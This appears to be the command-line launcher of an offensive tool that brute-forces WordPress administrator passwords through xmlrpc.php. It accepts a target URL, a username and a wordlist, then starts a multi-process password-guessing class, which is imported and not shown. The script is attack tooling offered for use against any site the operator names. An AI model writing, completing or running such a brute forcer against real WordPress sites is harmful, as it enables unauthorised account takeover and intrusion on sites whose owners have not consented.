import argparse
from classes.XMLRpcBruteForcer import XMLRpcBruteForcer


def main(args):
    brute_forcer = XMLRpcBruteForcer(
        username=args.username,
        wordlist=args.wordlist,
        url=args.target,
        processes=args.processes,
        verbose=args.verbose
    )

    brute_forcer.start()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Wordpress xmlrpc.php user password brute force.')
    
    parser.add_argument('-u', '--username', help='admin username', type=str, required=True)
    parser.add_argument('-w', '--wordlist', help='wordlist file path', type=str, required=True)
    parser.add_argument('-t', '--target', help='target URL', type=str, required=True)
    parser.add_argument('-p', '--processes', help='number of workers to run', type=int, default=3, required=False)
    parser.add_argument('-v', '--verbose', help='show tried passwords on the screen', action='store_true', default=False, required=False)
    
    args = parser.parse_args()
    main(args)